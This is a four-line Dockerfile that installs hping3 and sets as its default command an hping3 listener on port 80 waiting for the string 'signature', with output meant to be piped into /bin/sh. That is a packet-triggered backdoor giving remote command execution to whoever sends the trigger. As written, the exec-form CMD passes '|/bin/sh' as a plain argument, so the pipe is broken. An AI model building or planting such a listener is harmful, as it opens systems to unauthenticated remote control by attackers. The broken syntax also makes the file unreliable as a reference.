FROM ubuntu:latest
RUN apt-get update
RUN apt-get install -y hping3
CMD ["hping3", "-I", "eth0", "--listen", "signature", "-p", "80", "|/bin/sh"]
